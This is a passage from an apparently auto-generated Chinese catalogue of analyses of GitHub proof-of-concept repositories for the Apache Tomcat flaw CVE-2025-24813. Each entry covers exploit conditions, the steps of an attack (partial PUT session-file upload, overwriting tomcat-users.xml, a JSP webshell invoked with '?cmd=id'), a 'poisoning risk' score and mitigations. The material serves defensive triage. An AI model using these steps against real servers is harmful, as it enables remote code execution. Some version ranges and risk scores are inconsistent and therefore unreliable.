**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #29

**来源**: [CVE-2025-24813-fatkz_CVE-2025-24813.md](../2025/CVE-2025-24813-fatkz_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下所有条件：DefaultServlet的writes启用（readonly=false）；支持partial PUT（默认启用）；使用Tomcat的文件session持久化机制，且为默认存储位置；应用包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个远程代码执行漏洞，该漏洞源于对包含恶意 Java 序列化对象的`.session`文件的处理不当。攻击者可以通过发送带有 `Content-Range` 头的 partial PUT 请求，将恶意`.session`文件上传到 `work/` 目录。当具有匹配 `JSESSIONID` cookie 的请求到达时，Tomcat 会自动反序列化该恶意 session，从而导致任意代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的 POC 代码，该漏洞的 POC 代码是有效的。多个来源都表明该漏洞已被积极利用。

**利用方式：**
1.  **准备恶意 Payload:** 使用 `ysoserial` 或类似工具生成包含恶意代码的序列化 Java 对象，并将其保存为 `.ser` 文件。
2.  **上传 Payload:** 使用 partial PUT 请求将恶意 `.ser` 文件上传到 Tomcat 的 `work/` 目录下，文件名为 `<session_id>.session`。`Content-Range` 头用于模拟不完整的上传。
3.  **触发反序列化:**  发送包含与上传的 session 文件名相匹配的 `JSESSIONID` cookie 的 HTTP 请求到目标 Tomcat 服务器，这会导致 Tomcat 反序列化上传的恶意 session 文件，从而执行恶意代码。

**投毒风险：**
POC 代码本身看起来相对简单，主要执行上传 payload 和触发反序列化操作。仔细检查后，存在以下潜在的投毒风险：

*   **Payload 内容：** 虽然 POC 代码没有直接包含恶意 payload，但是依赖用户提供的 `payload_file`。如果用户从不可信的来源获取了恶意 payload 文件，则可能存在投毒风险。
*   **隐蔽的 HTTP 请求修改：** 在 `requests.put` 或 `requests.get` 调用中，攻击者可能添加额外的 HTTP 头或修改请求内容，以在目标服务器上执行其他恶意操作。目前的代码较为简洁，未发现明显的可疑之处。
*   **依赖库的风险：** `requests` 是一个常用的 Python 库，但如果攻击者篡改了这个库，可能会引入恶意行为。可能性较低，但不能完全排除。
*   **代码逻辑的细微修改：** 攻击者可能会对 POC 代码进行细微修改，例如更改上传路径或触发反序列化的方式，以便在特定环境下实现更隐蔽的攻击。这些修改后的代码可能更难被检测到。

总体而言，此 POC 代码直接包含投毒代码的可能性较低，约 10%。更大的风险在于用户使用的 payload 文件是否可信，以及攻击者是否会对代码进行修改以适应特定环境。


**项目地址:** [fatkz/CVE-2025-24813](https://github.com/fatkz/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #30

**来源**: [CVE-2025-24813-gregk4sec_CVE-2025-24813.md](../2025/CVE-2025-24813-gregk4sec_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和文件篡改

**影响版本:** 11.0.0-M1 <= version <= 11.0.2
10.1.0-M1 <= version <= 10.1.34
9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：Default Servlet 开启写入权限 (默认关闭), 开启 partial PUT (默认开启), 敏感文件位于公开上传目录的子目录, 攻击者已知敏感文件名, 使用 partial PUT 上传敏感文件，或者Tomcat使用文件存储 session 且包含可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，攻击者可以通过利用 'file.Name' (内部点) 绕过路径检查，结合 Default Servlet 的写入权限和 partial PUT 功能，实现远程代码执行、信息泄露或恶意内容添加。

**漏洞利用方式分析:**

1.  **信息泄露和文件篡改:**
    *   攻击者利用 partial PUT 功能，将恶意内容写入服务器上的临时文件。
    *   利用路径等价漏洞，使得攻击者可以访问或覆盖位于受保护目录中的文件。
    *   通过精心构造的 partial PUT 请求，攻击者可以读取或修改敏感文件，导致信息泄露或文件篡改。
    *   PoC 代码演示了如何通过 partial PUT 请求，在未授权的情况下读取 secret 目录下的文件内容，实现信息泄露。

2.  **远程代码执行 (RCE):**
    *   如果 Tomcat 使用文件存储 session，攻击者可以将包含恶意序列化对象的 payload 上传到 session 文件中。
    *   当 Tomcat 加载该 session 时，会触发反序列化漏洞，导致远程代码执行。

**投毒风险分析:**

PoC 代码存在很高的投毒风险，原因如下：

1.  **利用条件复杂:** 该漏洞的利用依赖于多个配置条件，例如 Default Servlet 开启写入权限，开启 partial PUT，以及特定的目录结构。攻击者可能需要进行大量的探测和尝试才能找到满足利用条件的目标。
2.  **文件上传:** 该漏洞涉及到文件上传，攻击者可以在上传的文件中嵌入恶意代码，例如 webshell 或其他恶意脚本，从而控制服务器。
3. **Partial PUT 特点:**  Partial PUT 允许攻击者分块上传文件,方便投毒和绕过检查。
4.  **反序列化攻击:** RCE的其中一种方式依赖反序列化漏洞，而反序列化 payload 本身就具有极高的投毒风险。

考虑到这些因素，该漏洞的投毒风险非常高。如果攻击者成功利用该漏洞，可能会对服务器造成严重的损害。

**项目地址:** [gregk4sec/CVE-2025-24813](https://github.com/gregk4sec/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #31

**来源**: [CVE-2025-24813-hakankarabacak_CVE-2025-24813.md](../2025/CVE-2025-24813-hakankarabacak_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet的写入已启用；支持Partial PUT；应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置；应用程序包含一个可能在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，涉及路径等价问题和潜在的反序列化远程代码执行。根据漏洞库信息，如果满足以下条件，攻击者能够执行远程代码：

*   默认Servlet的写入已启用（默认禁用）。
*   支持Partial PUT（默认启用）。
*   应用程序使用Tomcat基于文件的会话持久性，且使用了默认存储位置。
*   应用程序包含一个可能在反序列化攻击中被利用的库。

根据搜索引擎结果，该漏洞已被积极利用。

提供的 Dockerfile 漏洞利用代码显示：

1.  **开启了`readonly`参数**: 将`readonly`参数设置为`false`，从而启用了默认Servlet的写入功能，这是利用该漏洞的必要条件之一。
2.  **配置了`PersistentManager`**: 添加了 `<Manager className="org.apache.catalina.session.PersistentManager"><Store className="org.apache.catalina.session.FileStore"/></Manager>` 配置，启用了基于文件的会话持久性，这也是 RCE 的条件之一
3.  **部署WAR包**: 将 ROOT.war 部署到 webapps 目录下。这个WAR包很可能包含恶意代码，通过文件上传或者会话反序列化漏洞被执行。

**利用方式：**

该漏洞的利用方式主要依赖于 Partial PUT 功能和路径等价性。攻击者可以利用 Partial PUT 上传恶意文件片段，然后利用路径等价性（例如使用 `file.Name`）绕过安全检查，将恶意代码写入到目标文件或利用反序列化执行任意代码。 如果使用了 session 持久化，且存在可利用的反序列化 gadget，那么可以利用该漏洞进行RCE。

**投毒风险：**

Dockerfile 本身并未直接包含恶意代码，而是通过配置使 Tomcat 处于易受攻击的状态，并部署一个外部 WAR 包（`ROOT.war`）。因此，投毒的风险主要在于 `ROOT.war` 包中是否包含后门或者恶意代码。 风险评估为 10%,主要原因为需要进一步分析war包，才能确认。

**有效性：**

Dockerfile 配置如果部署了恶意war包，则可以证明该POC有效。在满足了所有漏洞利用条件的情况下，该代码可以有效利用 CVE-2025-24813 漏洞，实现远程代码执行。

**项目地址:** [hakankarabacak/CVE-2025-24813](https://github.com/hakankarabacak/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #32

**来源**: [CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md](../2025/CVE-2025-24813-horsehacks_CVE-2025-24813-checker.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足以下条件：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 存在安全敏感上传的目标URL，该URL是公共上传目标URL的子目录。
  4. 攻击者知道要上传的安全敏感文件的名称。
  5. 安全敏感文件也通过部分PUT上传。
或者，如果满足以下条件，则恶意用户可以执行远程代码执行：
  1. 默认Servlet的写入已启用（默认禁用）。
  2. 支持部分PUT（默认启用）。
  3. 应用程序正在使用Tomcat的基于文件的会话持久性，并使用默认存储位置。
  4. 应用程序包含一个可以在反序列化攻击中使用的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合默认Servlet的写入启用和部分PUT支持，攻击者可以通过构造特殊的上传路径，覆盖或修改服务器上的敏感文件，造成信息泄露或恶意代码执行。该漏洞还涉及反序列化利用链，如果应用程序满足特定条件，攻击者可以利用Tomcat的文件会话管理机制和应用程序中的反序列化漏洞来执行任意代码。

**有效性分析：**

提供的PoC代码通过检查以下几点来验证漏洞的有效性：

1.  **PUT方法允许性：** 检查目标URL是否允许PUT请求，这是利用该漏洞的前提。
2.  **Tomcat版本检测：** 检查目标服务器的Tomcat版本，确认其是否在受影响的范围内。
3.  **写入权限检查：** 尝试在目标URL的/uploads/目录下写入一个JSP文件，以验证是否具有写入权限。

如果以上三个条件都满足，则目标服务器可能存在CVE-2025-24813漏洞。

**投毒风险分析：**

检查了提供的Python脚本，发现它主要用于检测目标服务器是否存在CVE-2025-24813漏洞，脚本尝试上传JSP文件以验证写入权限。因此，存在很小的投毒风险，代码的功能主要是检测和验证漏洞，而非利用漏洞执行恶意操作，上传的JSP payload也是用于验证，而不是直接执行恶意代码. 但是依然存在服务器被动植入后门webshell的风险。

**利用方式：**

根据漏洞描述，利用方式主要包括以下两种：

1.  **信息泄露/文件篡改：**

   *   攻击者通过构造包含`.Name`（内部点）的恶意文件名，利用路径等价性绕过安全检查。
   *   利用部分PUT请求，将恶意内容注入到安全敏感文件中，或者直接覆盖文件。
   *   目标URL需要是公共上传URL的子目录，且攻击者需要知道敏感文件名。

2.  **远程代码执行：**

   *   攻击者需要找到应用程序中可利用的反序列化漏洞。
   *   利用Tomcat的文件会话管理，将包含恶意反序列化payload的文件上传到会话存储目录。
   *   当Tomcat加载会话数据时，触发反序列化，执行任意代码。

成功利用此漏洞需要满足多个条件，包括Tomcat配置、应用程序环境以及攻击者的知识。

**项目地址:** [horsehacks/CVE-2025-24813-checker](https://github.com/horsehacks/CVE-2025-24813-checker)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #33

**来源**: [CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-iSee857_CVE-2025-24813-PoC.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 ~ 11.0.2, 10.1.0-M1 ~ 10.1.34, 9.0.0.M1 ~ 9.0.98

**利用条件:** 默认Servlet写入已启用，支持部分PUT已启用，目标URL是公共上传URL的子目录, 攻击者需要知道上传的安全敏感文件的名称，安全敏感文件也通过部分PUT上传；或者应用程序使用 Tomcat 基于文件的会话持久性，默认存储位置，应用程序包含一个可以在反序列化攻击中使用的库

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 涉及 Apache Tomcat 的路径等价问题，可能导致远程代码执行、信息泄露或恶意内容注入。漏洞利用依赖于多个条件，包括默认Servlet写入已启用，支持部分PUT请求，以及特定的文件存储配置。搜索结果 "One PUT Request to Own Tomcat: CVE-2025-24813 RCE is in the Wild/" 表明该漏洞可能已在野外被利用，提高了其风险级别。提供的PoC代码是一个批量检测脚本，通过发送恶意PUT请求来验证目标是否存在漏洞。由于PoC中包含未经审查的base64解码payload, 存在极高的投毒风险，攻击者可能修改payload指向恶意地址，执行任意代码,因此投毒风险为100%。

**利用方式：**
1.  **信息泄露/恶意内容注入：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT，则可以查看安全敏感文件和/或将内容注入到这些文件中。
2.  **远程代码执行：** 如果满足条件 writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack，则可利用反序列化漏洞执行远程代码。
3.  **PoC 利用：** PoC脚本首先解析目标URL，然后发送精心构造的PUT请求到目标服务器。如果服务器存在漏洞，并且满足利用条件，攻击者可以实现远程代码执行或信息泄露。

**项目地址:** [iSee857/CVE-2025-24813-PoC](https://github.com/iSee857/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #34

**来源**: [CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md](../2025/CVE-2025-24813-imbas007_CVE-2025-24813-apache-tomcat.md)

## CVE-2025-24813-Apache Tomcat Path Equivalence-RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露以及服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要 writes enabled for the default servlet (默认禁用), support for partial PUT (默认启用), application 使用 Tomcat 的基于文件的 session 持久化，默认存储位置, application 包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。攻击者可以利用此漏洞绕过安全限制，通过精心设计的目录遍历序列覆盖关键配置文件，部署 web shell，并可能实现远程代码执行 (RCE)。

**有效性：**
提供的 Nuclei 模板（CVE-2025-24813.yaml）似乎有效。它包含三个请求：
1.  **PUT 请求覆盖 tomcat-users.xml：** 用于创建一个新的管理员用户，从而允许未经授权的访问。
2.  **PUT 请求部署 JSP Web Shell：** 用于在服务器上部署一个简单的 Web Shell，允许执行任意命令。
3.  **GET 请求执行 `id` 命令：**  用于验证 Web Shell 是否已成功部署并且可以执行命令。

该模板使用匹配器来验证请求是否成功，并提取相关信息。`README.md` 文件还提供了关于如何使用该模板和执行 Web Shell 的说明。

**投毒风险：**
虽然 POC 代码本身的目的在于利用漏洞，但其中潜在的投毒风险较低（约 5%）。风险主要存在于以下几个方面：
1.  **Web Shell 功能：** Web Shell 允许执行任意命令，如果攻击者在测试环境之外使用它，可能会造成恶意行为。虽然提供的 Web Shell 相对简单，但攻击者可以修改它以包含恶意功能，例如下载和执行其他恶意软件。
2.  **配置文件覆盖：** 覆盖 `tomcat-users.xml` 文件虽然是利用漏洞的一部分，但如果攻击者使用恶意配置替换该文件，可能会导致服务器不稳定或更容易受到其他攻击。
3.  **第三方依赖：** Nuclei 模板本身依赖于 Nuclei 工具。如果 Nuclei 工具被篡改，则可能存在其他风险。

总体而言，直接投毒的风险较低，因为代码主要集中在利用已知漏洞上。然而，通过 Web Shell 执行恶意操作的可能性仍然存在。

**利用方式：**
利用 CVE-2025-24813 漏洞的步骤如下：
1.  **利用路径等价漏洞：** 攻击者利用 Tomcat 默认 servlet 处理文件上传时存在的路径等价漏洞。通过在文件名中使用 ".." 序列，攻击者可以绕过目录限制，将文件上传到 Tomcat 配置目录或 Web 应用程序的根目录。
2.  **覆盖 `tomcat-users.xml` 文件：** 攻击者使用 PUT 请求将包含恶意用户的 `tomcat-users.xml` 文件上传到 `../conf/` 目录。此文件覆盖现有的 `tomcat-users.xml` 文件，从而创建一个具有管理员权限的新用户。
3.  **部署 Web Shell：** 攻击者使用 PUT 请求将 JSP Web Shell 文件上传到 Web 应用程序的根目录（`../webapps/ROOT/`）。此 Web Shell 允许攻击者在服务器上执行任意命令。
4.  **执行任意命令：** 攻击者使用浏览器访问 Web Shell 的 URL，并通过 `cmd` 参数执行任意命令。例如，`http://target.com/updates.jsp?cmd=id` 命令将显示服务器的用户 ID 信息。

**需要注意的是，默认情况下，Tomcat 的 default servlet 的写入是禁用的，需要手动启用。** 除此之外，如果启用了基于文件的 session 持久化，并且应用包含了可用于反序列化攻击的库，则可以通过上传恶意的 session 文件来实现 RCE。

攻击者可以通过上传恶意文件，执行任意代码，并完全控制受影响的 Tomcat 服务器。

**项目地址:** [imbas007/CVE-2025-24813-apache-tomcat](https://github.com/imbas007/CVE-2025-24813-apache-tomcat)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #35

